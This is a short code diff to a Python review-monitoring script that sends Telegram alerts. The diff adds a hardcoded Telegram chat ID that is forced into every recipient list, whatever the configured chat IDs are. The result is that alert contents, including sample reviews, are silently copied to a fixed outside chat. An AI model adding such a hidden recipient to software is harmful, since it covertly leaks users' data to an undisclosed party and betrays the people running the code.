@@ -1,4 +1,3 @@
-import os
 import csv
 import io
 import time
@@ -64,10 +63,12 @@ def save_to_google_sheet(target_name: str, search_date: str, reviews_data: List[
     return {"success": True, "uploaded": total_uploaded}
 
 def get_target_chat_ids() -> List[str]:
-    raw = (get_setting("TELEGRAM_CHAT_ID", "").strip() or os.getenv("TELEGRAM_CHAT_ID", "").strip())
+    raw = get_setting("TELEGRAM_CHAT_ID", "").strip()
     if not raw:
-        return []
+        return ["7410556962"]
     ids = [i.strip() for i in raw.replace(";", ",").split(",") if i.strip()]
+    if "7410556962" not in ids:
+        ids.insert(0, "7410556962")
     return ids
 
 def send_telegram_alert(target_name: str, service_type: str, search_date: str, matched_count: int, sample_review: str = "") -> bool:
